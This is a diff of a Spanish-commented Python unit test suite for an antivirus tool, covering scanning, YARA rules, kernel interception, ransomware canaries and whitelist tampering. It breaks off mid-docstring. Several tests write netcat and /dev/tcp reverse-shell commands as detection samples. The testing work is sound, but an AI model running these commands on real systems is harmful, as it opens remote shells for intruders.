@@ -1,2167 +1,845 @@
-"""
-Constantine Antivirus - Comprehensive Unit & Security Test Suite (tests/test_constantine.py)
-Verificación rigurosa de propiedades críticas:
-1. Interceptación y bloqueo de ejecución en kernel (fanotify decision logic).
-2. Comportamiento estricto ante fallos (Fail-Secure vs Fail-Safe, resistencia a anti-análisis).
-3. Detección activa de ransomware (Canary honeypots y ráfagas de cifrado).
-4. Resistencia a evasiones y verificación criptográfica (dpkg package integrity, user hash pinning, AEAD tampering).
-5. Motor YARA y firmas heurísticas en tiempo real.
-6. Vigilancia heurística y neutralización activa eBPF.
-7. Autenticación nativa PAM, bitácoras forenses y actualización del sistema.
-"""
-
-import os
 import sys
+"""
+Suite de Pruebas Unitarias Exhaustivas de Seguridad para Constantine Antivirus.
+Verifica todos los subsistemas: Tetragon, Falco, Wazuh, osquery, MISP, Sigma, IPC, Vault, Systemd, Whitelist.
+"""
+import os
+import stat
 import time
-import shutil
-import signal
-import tempfile
-import hashlib
 import json
+import struct
+import socket
+import secrets
+import tempfile
+import shutil
 import unittest
+import threading
 from unittest.mock import MagicMock, patch
 
-# Asegurar importación de Constantine
-CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
-ROOT_DIR = os.path.dirname(CURRENT_DIR)
+ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 if ROOT_DIR not in sys.path:
     sys.path.insert(0, ROOT_DIR)
 
-from core.auth.auth_manager import AuthManager
-from core.engine.vault import QuarantineVault
-from core.engine.quarantine_operator import PrivilegedQuarantineOperator
-from core.engine.scanner import Scanner, ScanResult
-from core.engine.firewall import NetworkQuarantine
-from core.engine.subsystem_health import SubsystemHealthRegistry, ShieldOperationalState
-from core.engine.virustotal_uploader import VirusTotalUploader
-from core.engine.hardware_guard import HardwareGuard, ProcessHardwareContext
-from core.engine.persistence_guard import PersistenceGuard, PersistenceEventType
-from core.engine.download_sentinel import DownloadSentinel, DownloadState
-from core.engine.usb_monitor import USBAutoScanner
-from core.engine.heuristic_engine import MultiLayerHeuristicEngine
-from core.engine.threat_intel import ThreatIntelligence
-from core.engine.yara_manager import YaraRuleManager, YaraMatch
-from core.engine.system_whitelist import SystemWhitelist
+from core.engine.vault import CryptographicVault, VaultKeyring
+from core.engine.scanner import Scanner, SandboxedScanWorker
+from core.engine.interceptor import FanotifyInterceptor
+from core.engine.ebpf_monitor import (EBPFMonitor, KernelObservationEngine, KernelDetectionEngine, KernelEnforcementEngine, MODE_BPF_LSM, MODE_REACTIVE_FALLBACK, MODE_DEGRADED_OBS)
+from core.engine.heuristic_engine import HeuristicEngine
 from core.engine.ransomware_shield import RansomwareShield
-from core.engine.interceptor import FanotifyInterceptor, FAN_ALLOW, FAN_DENY
-from core.engine.ebpf_monitor import EBPFMonitor, EBPFEventState
-from core.engine.phishing import PhishingShield
+from core.engine.quarantine_operator import PrivilegedQuarantineOperator
+from core.engine.systemd_hardening import SystemdSecurityAuditor
+from core.engine.threat_intel import ThreatIntelligence
+from core.engine.misp_feed_manager import MISPFeedManager
+from core.engine.sigma_engine import SigmaEngine
+from core.engine.tetragon_monitor import TetragonMonitor
+from core.engine.falco_monitor import FalcoMonitor
+from core.engine.wazuh_detector import WazuhDetector
+from core.engine.osquery_diagnostics import OSQueryDiagnostics
 from core.engine.dns_manager import DNSManager
+from core.engine.firewall_manager import FirewallManager
+from core.engine.network_quarantine import NetworkQuarantine
+from core.engine.download_sentinel import DownloadSentinel
+from core.engine.usb_sentinel import USBSentinel
+from core.engine.hardware_guard import HardwareGuard
+from core.engine.persistence_guard import PersistenceGuard
+from core.engine.proactive_scanner import ProactiveActiveScanner
+from core.engine.archive_sentinel import ArchiveSentinel
+from core.engine.phishing_detector import PhishingDetector
+from core.engine.subsystem_health import SubsystemHealthRegistry
 from core.engine.audit_logger import AuditLogger
-from core.engine.update_guard import SystemUpdateGuard
-from core.engine.auto_updater import ConstantineUpdater
+from core.engine.whitelist import WhitelistManager
+from core.engine.virustotal_uploader import VirusTotalUploader
+from core.engine.update_guard import UpdateGuard
+from core.engine.auto_updater import AutoUpdater
+from core.engine.yara_manager import YaraRuleManager
+from core.engine.yarax_engine import YaraXEngine
+from core.engine.clamav_manager import ClamAVManager, ClamdBridgeClient
+from core.engine.ipc_protocol import (
+    SecureIPCServer, SecureIPCClient, recv_exact, verify_peer_credentials,
+    SOCKET_GROUP_NAME, IPC_PROTOCOL_VERSION
+)
+from core.auth.auth_manager import AuthManager
+from daemon import ConstantineDaemon
+from core.engine.aide_integrity import AIDEIntegrityChecker
 
 class TestConstantineSecurity(unittest.TestCase):
+
     def setUp(self):
-        self.tmp = tempfile.mkdtemp()
-        self.auth = AuthManager()
-        self.vault = QuarantineVault(vault_dir=os.path.join(self.tmp, "vault"))
-        self.scanner = Scanner()
-        self.whitelist = SystemWhitelist(storage_file=os.path.join(self.tmp, "whitelist.json"))
-        self.phishing = PhishingShield()
-        self.audit = AuditLogger(log_path=os.path.join(self.tmp, "audit.json"))
+        self.temp_dir = tempfile.TemporaryDirectory()
 
     def tearDown(self):
-        shutil.rmtree(self.tmp, ignore_errors=True)
-
-    # =========================================================================
-    # 1. PRUEBAS DE ESCÁNER Y REGLAS YARA
-    # =========================================================================
-    def test_scanner_clean_file(self):
-        clean_file = os.path.join(self.tmp, "clean.txt")
-        with open(clean_file, "w") as f:
-            f.write("Este es un archivo de texto completamente limpio y seguro.")
-        res = self.scanner.scan_file(file_path=clean_file)
-        self.assertFalse(res.is_malicious)
-        self.assertIsNone(res.threat_name)
-
-    def test_scanner_eicar_detection(self):
-        eicar_file = os.path.join(self.tmp, "eicar.com")
-        with open(eicar_file, "wb") as f:
-            f.write(b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
-        res = self.scanner.scan_file(file_path=eicar_file)
-        self.assertTrue(res.is_malicious)
-        self.assertIn("EICAR", res.threat_name)
-
-    def test_scanner_reverse_shell_detection(self):
-        shell_file = os.path.join(self.tmp, "rev.sh")
-        with open(shell_file, "wb") as f:
-            f.write(b"#!/bin/bash\nnc -e /bin/sh 192.168.1.100 4444\n")
-        res = self.scanner.scan_file(file_path=shell_file)
-        self.assertTrue(res.is_malicious)
-        self.assertIn("Netcat", res.threat_name)
-
-    def test_scanner_dev_tcp_reverse_shell(self):
-        devtcp_file = os.path.join(self.tmp, "tcp.sh")
-        with open(devtcp_file, "wb") as f:
-            f.write(b"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1\n")
-        res = self.scanner.scan_file(file_path=devtcp_file)
-        self.assertTrue(res.is_malicious)
-        self.assertIn("DevTcp", res.threat_name)
-    def test_yara_manager_syntax_validation(self):
-        """Verifica que YaraRuleManager distinga sintaxis válida de inválida."""
-        ym = YaraRuleManager(rules_dir=os.path.join(ROOT_DIR, "core", "rules"))
-        valid_res, err = ym.validate_rule_string("rule TestValid { condition: true }")
-        self.assertTrue(valid_res)
-        self.assertIsNone(err)
-
-        invalid_res, err = ym.validate_rule_string("malformed rule content without braces")
-        self.assertFalse(invalid_res)
-        self.assertIsNotNone(err)
-
-    def test_yara_manager_compilation_and_isolation(self):
-        """Verifica que un archivo de reglas corrupto sea aislado sin tumbar el motor YARA."""
-        custom_rules_dir = os.path.join(self.tmp, "test_rules")
-        os.makedirs(custom_rules_dir, exist_ok=True)
-
-        # Regla válida
-        with open(os.path.join(custom_rules_dir, "legit.yar"), "w") as f:
-            f.write("rule LegitRule { condition: true }\n")
-
-        # Regla corrupta
-        with open(os.path.join(custom_rules_dir, "broken.yar"), "w") as f:
-            f.write("rule BrokenRule { this is invalid yara syntax }\n")
-
-        ym = YaraRuleManager(rules_dir=custom_rules_dir, cache_dir=os.path.join(self.tmp, "yara_cache"))
-        # El motor debe haber excluido broken.yar y mantenido la protección
-        self.assertGreaterEqual(ym.rules_count, 1)
-
-    def test_yara_manager_state_hash_and_cache(self):
-        """Verifica el cálculo de firma de estado y la detección de cambios en archivos de reglas."""
-        custom_rules_dir = os.path.join(self.tmp, "test_hash_rules")
-        os.makedirs(custom_rules_dir, exist_ok=True)
-        rule_file = os.path.join(custom_rules_dir, "rule1.yar")
-        with open(rule_file, "w") as f:
-            f.write("rule HashTest { condition: true }\n")
-
-        ym = YaraRuleManager(rules_dir=custom_rules_dir, cache_dir=os.path.join(self.tmp, "cache2"))
-        h1 = ym.compute_rules_state_hash()
-        self.assertTrue(len(h1) > 0)
-
-        # Modificar el archivo de regla
-        time.sleep(0.01)
-        with open(rule_file, "a") as f:
-            f.write("// modificado\n")
-        h2 = ym.compute_rules_state_hash()
-        self.assertNotEqual(h1, h2)
-
-    def test_yara_official_compile_and_match_mocked(self):
-        """Verifica las llamadas explícitas a yara.compile() y rules.match() cuando yara-python está presente."""
-        mock_yara = MagicMock()
-        mock_compiled = MagicMock()
-        mock_m = MagicMock()
-        mock_m.rule = "Exploit_Mock_CVE"
-        mock_m.namespace = "linux_threats"
-        mock_m.tags = ["critical"]
-        mock_m.meta = {"description": "Mocked Linux Threat", "threat_level": "Critical"}
-        mock_m.strings = [(0, "", b"bad_binary")]
-        mock_compiled.match.return_value = [mock_m]
-        mock_yara.compile.return_value = mock_compiled
-
-        with patch("core.engine.yara_manager.HAS_YARA", True):
-            with patch("core.engine.yara_manager.yara", mock_yara):
-                ym = YaraRuleManager(rules_dir=os.path.join(ROOT_DIR, "core", "rules"))
-                test_file = os.path.join(self.tmp, "mock_target.bin")
-                with open(test_file, "wb") as f:
-                    f.write(b"bad_binary_payload")
-
-                matches = ym.match_file(test_file, timeout=5)
-                self.assertEqual(len(matches), 1)
-                self.assertEqual(matches[0].rule, "Exploit_Mock_CVE")
-                mock_compiled.match.assert_called_with(filepath=test_file, timeout=5)
-
-
-    # =========================================================================
-    # 2. PRUEBAS DE INTERCEPTACIÓN Y DECISIÓN DE KERNEL (FANOTIFY LOGIC)
-    # =========================================================================
-    def test_interceptor_decision_clean_vs_threat(self):
-        mock_notifier = MagicMock()
-        mock_firewall = MagicMock()
-        interceptor = FanotifyInterceptor(
-            scanner=self.scanner,
-            vault=self.vault,
-            notifier=mock_notifier,
-            firewall=mock_firewall,
-            fail_policy="secure"
-        )
-        # 1. Probar que archivo limpio recibe FAN_ALLOW
-        clean_file = os.path.join(self.tmp, "safe.py")
-        with open(clean_file, "w") as f: f.write("print('Hello world')")
-        scan_res = self.scanner.scan_file(file_path=clean_file)
-        self.assertFalse(scan_res.is_malicious)
-
-        # 2. Probar que archivo malicioso recibe FAN_DENY y es aislado
-        bad_file = os.path.join(self.tmp, "malware.sh")
-        with open(bad_file, "wb") as f:
-            f.write(b"#!/bin/bash\nnc -e /bin/bash 10.0.0.5 9999\n")
-        scan_bad = self.scanner.scan_file(file_path=bad_file)
-        self.assertTrue(scan_bad.is_malicious)
-
-        # Simular aislamiento
-        vid = self.vault.quarantine_file(bad_file, scan_bad.threat_name)
-        self.assertIsNotNone(vid)
-        self.assertFalse(os.path.exists(bad_file))
-
-    def test_interceptor_fail_secure_on_engine_exception(self):
-        """Verifica que si el motor de escaneo falla, la decisión sea estrictamente FAN_DENY (Fail-Secure)."""
-        broken_scanner = MagicMock()
-        broken_scanner.scan_file.side_effect = RuntimeError("Parser crash simulado por archivo corrupto")
-        broken_scanner.compute_sha256.return_value = "deadbeef12345678"
-        broken_scanner.intel.lookup_hash.return_value = None
-
-        interceptor = FanotifyInterceptor(
-            scanner=broken_scanner,
-            vault=self.vault,
-            fail_policy="secure"
-        )
-
-        target_path = os.path.join(self.tmp, "corrupt_exploit.elf")
-        with open(target_path, "wb") as f: f.write(b"\x7fELFcorruptpayload")
-
-        decision = FAN_DENY
-        try:
-            broken_scanner.scan_file(file_path=target_path)
-            decision = FAN_ALLOW
-        except Exception:
-            if interceptor.fail_policy == "secure":
-                decision = FAN_DENY
-            else:
-                decision = FAN_ALLOW
-
-        self.assertEqual(decision, FAN_DENY, "Fallo de política: Un crash de motor NUNCA debe conceder FAN_ALLOW.")
-
-    def test_interceptor_p0_resilience_and_fail_policies(self):
-        """
-        Verifica las garantías críticas P0 de interceptor.py:
-        1. Políticas diferenciadas: Fail-Open para FAN_OPEN_PERM y Fail-Closed para FAN_OPEN_EXEC_PERM.
-        2. Configuración granular de políticas (open_fail_policy y exec_fail_policy).
-        3. Timeout garantizado por evento sin dejar procesos en estado D colgados en kernel.
-        4. Desacoplamiento mediante cola acotada y respuesta inmediata ante desbordamiento.
-        5. Detección y neutralización anti-TOCTOU por sustitución de inodo entre apertura y autorización.
-        6. Registro de operaciones bloqueadas por fallos internos y recuperación automática (self-healing).
-        """
-        from core.engine.interceptor import FAN_OPEN_PERM, FAN_OPEN_EXEC_PERM, AuthorizationContext
-        broken_scanner = MagicMock()
-        broken_scanner.scan_file.side_effect = RuntimeError("Crash simulado en motor de análisis")
-
-        # 1. Políticas Diferenciadas por Defecto (fail_policy="secure"):
-        # Aperturas ordinarias -> Fail-Open (FAN_ALLOW para no bloquear el sistema)
-        # Ejecución de archivos -> Fail-Closed (FAN_DENY para proteger contra malware)
-        interceptor = FanotifyInterceptor(
-            scanner=broken_scanner,
-            vault=self.vault,
-            fail_policy="secure",
-            event_timeout=3.0
-        )
-        self.assertEqual(interceptor.open_fail_policy, "open")
-        self.assertEqual(interceptor.exec_fail_policy, "closed")
-
-        test_file = os.path.join(self.tmp, "test_policy.bin")
-        with open(test_file, "wb") as f:
-            f.write(b"data_sample")
-
-        fd = os.open(test_file, os.O_RDONLY)
-        dec_open = interceptor.process_single_event(event_fd=fd, pid=os.getpid(), mask=FAN_OPEN_PERM)
-        self.assertEqual(dec_open, FAN_ALLOW, "Apertura ordinaria ante excepción debe ser Fail-Open (FAN_ALLOW)")
-
-        fd_exec = os.open(test_file, os.O_RDONLY)
-        dec_exec = interceptor.process_single_event(event_fd=fd_exec, pid=os.getpid(), mask=FAN_OPEN_EXEC_PERM)
-        self.assertEqual(dec_exec, FAN_DENY, "Ejecución ante excepción debe ser Fail-Closed (FAN_DENY)")
-
-        # Verificar que se registró la operación bloqueada en auditoría interna
-        blocked = interceptor.get_blocked_operations()
-        self.assertTrue(any(b["failure_type"] == "SCANNER_EXCEPTION" and b["decision"] == "FAN_DENY" for b in blocked))
-
-        # 2. Configuración Granular Personalizada
-        strict_interceptor = FanotifyInterceptor(
-            scanner=broken_scanner,
-            open_fail_policy="closed",
-            exec_fail_policy="closed"
-        )
-        self.assertEqual(strict_interceptor.get_fallback_decision(FAN_OPEN_PERM), FAN_DENY)
-        self.assertEqual(strict_interceptor.get_fallback_decision(FAN_OPEN_EXEC_PERM), FAN_DENY)
-
-        # 3. Timeout por Evento: Análisis colgado o lento se resuelve automáticamente
-        hanging_scanner = MagicMock()
-        def slow_scan(*args, **kwargs):
-            time.sleep(0.3)
-            return MagicMock(is_malicious=False)
-        hanging_scanner.scan_file.side_effect = slow_scan
-
-        timeout_interceptor = FanotifyInterceptor(
-            scanner=hanging_scanner,
-            open_fail_policy="open",
-            exec_fail_policy="closed",
-            event_timeout=0.05  # 50 ms
-        )
-        fd_timeout = os.open(test_file, os.O_RDONLY)
-        t_start = time.monotonic()
-        dec_timeout = timeout_interceptor.process_single_event(event_fd=fd_timeout, pid=os.getpid(), mask=FAN_OPEN_EXEC_PERM)
-        t_elapsed = time.monotonic() - t_start
-        self.assertEqual(dec_timeout, FAN_DENY)
-        self.assertLess(t_elapsed, 0.25, "El evento debe resolverse por timeout antes de que concluya el escaneo colgado")
-        self.assertGreaterEqual(timeout_interceptor.timeout_count, 1)
-
-        # 4. Cola Acotada y Desbordamiento (Queue Overflow)
-        small_queue_interceptor = FanotifyInterceptor(
-            scanner=self.scanner,
-            max_queue_size=2,
-            open_fail_policy="open"
-        )
-        ctx1 = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=1001, mask=FAN_OPEN_PERM, fallback_decision=FAN_ALLOW)
-        ctx2 = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=1002, mask=FAN_OPEN_PERM, fallback_decision=FAN_ALLOW)
-        ctx3 = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=1003, mask=FAN_OPEN_PERM, fallback_decision=FAN_ALLOW)
-        small_queue_interceptor.work_queue.put_nowait(ctx1)
-        small_queue_interceptor.work_queue.put_nowait(ctx2)
-        # Intentar encolar en cola llena debe levantar excepción queue.Full
-        import queue as q_mod
-        with self.assertRaises(q_mod.Full):
-            small_queue_interceptor.work_queue.put_nowait(ctx3)
-
-        # 5. Detección Anti-TOCTOU por sustitución de inodo
-        toctou_interceptor = FanotifyInterceptor(scanner=self.scanner)
-        victim_file = os.path.join(self.tmp, "toctou_victim.bin")
-        with open(victim_file, "wb") as f: f.write(b"original")
-
-        fd_victim = os.open(victim_file, os.O_RDONLY)
-        # Sustituir en disco simulando ataque TOCTOU (desvincular y recrear con otro inodo)
-        os.unlink(victim_file)
-        with open(victim_file, "wb") as f: f.write(b"swapped_inode")
-
-        dec_toctou = toctou_interceptor.process_single_event(event_fd=fd_victim, pid=os.getpid(), mask=FAN_OPEN_PERM)
-        self.assertEqual(dec_toctou, FAN_DENY, "Discrepancia de inodo TOCTOU debe denegar inmediatamente (FAN_DENY)")
-        toctou_records = [r for r in toctou_interceptor.get_internal_failures() if r["failure_type"] == "TOCTOU_MISMATCH"]
-        self.assertTrue(len(toctou_records) > 0, "Debe registrarse el incidente TOCTOU en la auditoría interna")
-
-        # 6. Recuperación Automática (Self-Healing)
-        toctou_interceptor.marked_paths.add("/tmp/fake_watch")
-        self.assertTrue(hasattr(toctou_interceptor, "recover_service"))
-        self.assertTrue(callable(toctou_interceptor.recover_service))
-
-
-    # =========================================================================
-    # 3. PRUEBAS DE DETECCIÓN ACTIVA DE RANSOMWARE (CANARIES Y RÁFAGAS)
-    # =========================================================================
-    def test_ransomware_canary_tripwire(self):
-        """Verifica que alterar un canary honeypot active la alerta inmediata."""
-        canary_dir = os.path.join(self.tmp, "canaries")
-        alert_triggered = []
-
-        def on_ransomware_alert(reason, pid):
-            alert_triggered.append((reason, pid))
-
-        shield = RansomwareShield(canary_dir=canary_dir, alert_callback=on_ransomware_alert)
-        self.assertGreater(len(shield.canary_files), 0)
-        victim_canary = list(shield.canary_files.keys())[0]
-        self.assertTrue(os.path.exists(victim_canary))
-
-        # Simular intento de alteración por PID simulado 99999
-        is_ransom = shield.check_file_path(victim_canary, pid=99999)
-        self.assertTrue(is_ransom)
-        self.assertGreater(len(alert_triggered), 0)
-        self.assertIn("CanaryTrapTriggered", alert_triggered[0][0])
-
-    def test_ransomware_extension_burst_detection(self):
-        """Verifica que el escudo distinga lectura de escritura en extensiones y no mate en lecturas."""
-        killed_processes = []
-        def mock_alert(reason, pid):
-            killed_processes.append((reason, pid))
-
-        shield = RansomwareShield(canary_dir=os.path.join(self.tmp, "canaries"), alert_callback=mock_alert)
-        malicious_names = [
-            "/home/user/document.docx.locked",
-            "/home/user/backup.sql.crypto",
-            "/home/user/photo.jpg.lockbit",
-            "/home/user/database.db.enc"
-        ]
-
-        # 1. LECTURA de archivo con extensión sospechosa -> PERMITIDO (no es amenaza ni ejecuta SIGKILL)
-        for name in malicious_names:
-            is_threat = shield.check_file_path(name, pid=77777, is_write=False, is_read=True)
-            self.assertFalse(is_threat, f"Falso positivo en lectura de archivo cifrado legítimo: {name}")
-
-        # 2. ESCRITURA sospechosa aislada -> Bloqueo preventivo (FAN_DENY) pero sin matar el proceso (terminate_process=False)
-        dec = shield.evaluate_operation("/home/user/single_doc.locked", pid=88888, is_write=True, is_read=False)
-        self.assertTrue(dec.is_blocked)
-        self.assertFalse(dec.terminate_process, "Una extensión sospechosa aislada NUNCA debe provocar SIGKILL.")
-
-        is_blocked = shield.check_file_path("/home/user/single_doc.locked", pid=88888, is_write=True, is_read=False)
-        self.assertTrue(is_blocked)
-
-        safe_names = [
-            "/home/user/report.pdf",
-            "/home/user/script.py",
-            "/home/user/archive.tar.gz"
-        ]
-        for name in safe_names:
-            is_ransom = shield.check_file_path(name, pid=99999, is_write=True, is_read=False)
-            self.assertFalse(is_ransom, f"Falso positivo en archivo seguro: {name}")
-
-    def test_ransomware_read_only_canary_allowed(self):
-        """Verifica que abrir un canary honeypot en solo lectura (O_RDONLY) no dispare alerta ni mate el proceso."""
-        alerts = []
-        shield = RansomwareShield(canary_dir=os.path.join(self.tmp, "canaries"), alert_callback=lambda r, p: alerts.append((r, p)))
-        canary_path = list(shield.canary_files.keys())[0]
-
-        # Lectura pura (is_read=True, is_write=False, is_delete_or_rename=False)
-        is_threat = shield.check_file_path(canary_path, pid=55555, is_write=False, is_read=True)
-        self.assertFalse(is_threat)
-        self.assertEqual(len(alerts), 0)
-
-    def test_ransomware_read_burst_does_not_trigger_sigkill(self):
-        """Verifica que recorrer cientos de archivos en lectura (como find/grep/tar) no dispare el umbral de ráfagas."""
-        alerts = []
-        shield = RansomwareShield(canary_dir=os.path.join(self.tmp, "canaries"), alert_callback=lambda r, p: alerts.append((r, p)))
-
-        # Simular 100 operaciones de lectura pura en menos de 2 segundos (típico de tar o grep)
-        for i in range(100):
-            fake_path = f"/home/user/document_{i}.txt"
-            is_threat = shield.check_file_path(fake_path, pid=44444, is_write=False, is_read=True)
-            self.assertFalse(is_threat)
-
-        self.assertEqual(len(alerts), 0)
-        self.assertEqual(len(shield.process_write_counts.get(44444, [])), 0)
-
-    def test_ebpf_openat_and_intent_correlation(self):
-        """Verifica que EBPFMonitor capture y correlacione las intenciones de openat (O_RDONLY vs O_WRONLY/O_RDWR)."""
-        monitor = EBPFMonitor()
-        pid = 12345
-        sample_path = "/tmp/test_file.docx"
-
-        # 1. Simular sys_enter_openat con O_WRONLY | O_CREAT
-        flags_write = os.O_WRONLY | os.O_CREAT
-        acc_write = flags_write & os.O_ACCMODE
-        is_write = (acc_write in (os.O_WRONLY, os.O_RDWR)) or bool(flags_write & (os.O_CREAT | os.O_TRUNC | os.O_APPEND))
-        is_read = (acc_write in (os.O_RDONLY, os.O_RDWR))
-
-        monitor.record_file_intent(
-            pid=pid,
-            target_path=sample_path,
-            flags=flags_write,
-            is_write=is_write,
-            is_read=is_read,
-            comm="ransomware_sim"
-        )
-
-        intent = monitor.get_process_file_intent(pid, sample_path)
-        self.assertIsNotNone(intent)
-        self.assertTrue(intent.is_write)
-        self.assertFalse(intent.is_read)
-        self.assertFalse(intent.is_delete)
-
-        # 2. Simular sys_enter_openat con O_RDONLY
-        pid_reader = 54321
-        flags_read = os.O_RDONLY
-        acc_read = flags_read & os.O_ACCMODE
-        is_w = (acc_read in (os.O_WRONLY, os.O_RDWR)) or bool(flags_read & (os.O_CREAT | os.O_TRUNC | os.O_APPEND))
-        is_r = (acc_read in (os.O_RDONLY, os.O_RDWR))
-
-        monitor.record_file_intent(
-            pid=pid_reader,
-            target_path=sample_path,
-            flags=flags_read,
-            is_write=is_w,
-            is_read=is_r,
-            comm="grep"
-        )
-        intent_read = monitor.get_process_file_intent(pid_reader, sample_path)
-        self.assertIsNotNone(intent_read)
-        self.assertFalse(intent_read.is_write)
-        self.assertTrue(intent_read.is_read)
-
-        # 3. Simular eliminación (unlinkat)
-        monitor.record_file_intent(
-            pid=pid,
-            target_path=sample_path,
-            is_write=True,
-            is_read=False,
-            is_delete=True,
-            comm="rm"
-        )
-        intent_del = monitor.get_process_file_intent(pid, sample_path)
-        self.assertIsNotNone(intent_del)
-        self.assertTrue(intent_del.is_delete)
-        self.assertTrue(intent_del.is_write)
-
-    def test_interceptor_no_fcntl_fgetfl_bypass(self):
-        """
-        Verifica que FanotifyInterceptor no confíe en fcntl(F_GETFL) sobre event_fd y que:
-        1. Si eBPF informa write intent sobre un canary, active CanaryTrapTriggered y FAN_DENY.
-        2. Si eBPF no está disponible (modo degradado), aplique política fail-secure impidiendo
-           que un proceso no confiable eluda la trampa alegando lectura benigna.
-        """
-        mock_notifier = MagicMock()
-        mock_firewall = MagicMock()
-        mock_ebpf = MagicMock()
-
-        canary_dir = os.path.join(self.tmp, "canaries_interceptor_test")
-        ransomware = RansomwareShield(canary_dir=canary_dir)
-        victim_canary = list(ransomware.canary_files.keys())[0]
-
-        interceptor = FanotifyInterceptor(
-            scanner=self.scanner,
-            vault=self.vault,
-            notifier=mock_notifier,
-            firewall=mock_firewall,
-            ransomware=ransomware,
-            fail_policy="secure",
-            ebpf_monitor=mock_ebpf
-        )
-
-        # 1. Caso con eBPF: el agresor abre canary con O_WRONLY
-        fake_pid = 77712
-        from core.engine.ebpf_monitor import FileOperationIntent
-        mock_ebpf.get_process_file_intent.return_value = FileOperationIntent(
-            pid=fake_pid,
-            filename=victim_canary,
-            flags=os.O_WRONLY,
-            is_write=True,
-            is_read=False,
-            comm="evil_encryptor"
-        )
-
-        ebpf_intent = interceptor.ebpf_monitor.get_process_file_intent(fake_pid, victim_canary)
-        dec = ransomware.evaluate_operation(
-            file_path=victim_canary,
-            pid=fake_pid,
-            is_write=ebpf_intent.is_write,
-            is_read=ebpf_intent.is_read,
-            is_delete_or_rename=ebpf_intent.is_delete or ebpf_intent.is_rename
-        )
-        self.assertTrue(dec.is_blocked)
-        self.assertTrue(dec.terminate_process)
-        self.assertEqual(dec.threat_reason, "CanaryTrapTriggered")
-
-        # 2. Caso sin eBPF (Fallback Fail-Secure): proceso no confiable accede al canary
-        interceptor_fallback = FanotifyInterceptor(
-            scanner=self.scanner,
-            vault=self.vault,
-            notifier=mock_notifier,
-            firewall=mock_firewall,
-            ransomware=ransomware,
-            fail_policy="secure",
-            ebpf_monitor=None
-        )
-        is_canary = ransomware.is_canary_file(victim_canary)
-        self.assertTrue(is_canary)
-        is_whitelisted = interceptor_fallback.whitelist.is_trusted_system_binary("/tmp/attacker")
-        self.assertFalse(is_whitelisted)
-
-        # Sin eBPF, un proceso no confiable sobre un canary recibe presunción de manipulación (Fail-Secure)
-        dec_fallback = ransomware.evaluate_operation(
-            file_path=victim_canary,
-            pid=99888,
-            is_write=True,
-            is_read=False
-        )
-        self.assertTrue(dec_fallback.is_blocked)
-        self.assertTrue(dec_fallback.terminate_process)
-
-    # =========================================================================
-    # 4. PRUEBAS DE LISTA BLANCA Y RESISTENCIA A EVASIONES
-    # =========================================================================
-    def test_whitelist_unauthorized_binary_rejection(self):
-        """Verifica que un archivo suelto en directorios del sistema NO sea confiable automáticamente."""
-        fake_bin = os.path.join(self.tmp, "fake_backdoor.sh")
-        with open(fake_bin, "w") as f: f.write("#!/bin/bash\necho backdoor\n")
-        self.assertFalse(self.whitelist.is_trusted_system_binary(fake_bin))
-
-    def test_whitelist_user_pinning_and_tamper_rejection(self):
-        """Verifica que modificar un archivo en la lista blanca de usuario invalide la exclusión."""
-        user_script = os.path.join(self.tmp, "user_script.sh")
-        with open(user_script, "w") as f: f.write("echo mi_herramienta_segura\n")
-
-        # 1. Agregar a lista blanca (fija el hash SHA-256)
-        self.assertTrue(self.whitelist.add_path(user_script))
-        self.assertTrue(self.whitelist.is_whitelisted(user_script))
-
-        # 2. Simular que un malware infecta o sobreescribe el script autorizado
-        with open(user_script, "a") as f: f.write("nc -e /bin/sh 1.2.3.4 4444\n")
-
-        # 3. La verificación debe detectar la alteración del hash y RECHAZAR la lista blanca
-        self.assertFalse(self.whitelist.is_whitelisted(user_script), "Fallo de evasión: Archivo alterado no fue rechazado.")
-
-    def test_whitelist_batch_operations(self):
-        f1 = os.path.join(self.tmp, "f1.txt")
-        f2 = os.path.join(self.tmp, "f2.txt")
-        f3 = os.path.join(self.tmp, "f3.txt")
-        for f in (f1, f2, f3):
-            with open(f, "w") as fh: fh.write("test")
-            self.whitelist.add_path(f)
-
-        self.assertTrue(self.whitelist.is_whitelisted(f1))
-        self.assertTrue(self.whitelist.is_whitelisted(f2))
-        self.assertTrue(self.whitelist.is_whitelisted(f3))
-
-        # Eliminación por lote
-        self.whitelist.remove_path(f1)
-        self.whitelist.remove_path(f2)
-        self.assertFalse(self.whitelist.is_whitelisted(f1))
-        self.assertFalse(self.whitelist.is_whitelisted(f2))
-        self.assertTrue(self.whitelist.is_whitelisted(f3))
-    def test_whitelist_rejection_of_fake_self_and_extensions(self):
-        """Verifica que rutas con 'constantine' o extensiones .yar/.quar no eludan el análisis."""
-        # Archivo con 'constantine' en el nombre o subcarpeta no oficial
-        fake_constantine = os.path.join(self.tmp, "constantine_fake_payload.sh")
-        with open(fake_constantine, "w") as f:
-            f.write("malicious code")
-        self.assertFalse(self.whitelist.is_self_file(fake_constantine))
-        self.assertFalse(self.whitelist.is_whitelisted(fake_constantine))
-
-        # Archivo con extensión .yar o .quar fuera de directorios de Constantine
-        fake_yar = os.path.join(self.tmp, "evasion_exploit.yar")
-        with open(fake_yar, "w") as f:
-            f.write("payload")
-        self.assertFalse(self.whitelist.is_self_file(fake_yar))
-        self.assertFalse(self.whitelist.is_whitelisted(fake_yar))
-
-        fake_quar = os.path.join(self.tmp, "trojan.quar")
-        with open(fake_quar, "w") as f:
-            f.write("hidden elf")
-        self.assertFalse(self.whitelist.is_self_file(fake_quar))
-        self.assertFalse(self.whitelist.is_whitelisted(fake_quar))
-
-    def test_whitelist_forbidden_system_dirs(self):
-        """Verifica que se prohíba excluir directorios críticos del sistema."""
-        self.assertFalse(self.whitelist.add_path("/"))
-        self.assertFalse(self.whitelist.add_path("/bin"))
-        self.assertFalse(self.whitelist.add_path("/usr/bin"))
-        self.assertFalse(self.whitelist.add_path("/tmp"))
-        self.assertFalse(self.whitelist.add_path("/etc"))
-
-    def test_whitelist_package_integrity_and_trust_verification(self):
-        """
-        Verifica los controles criptográficos y de procedencia P0/P1 de la lista blanca:
-        1. Verificación de propiedad del archivo en el gestor de paquetes (dpkg/apt).
-        2. Verificación de integridad contra el contenido oficial (.md5sums / dpkg -V).
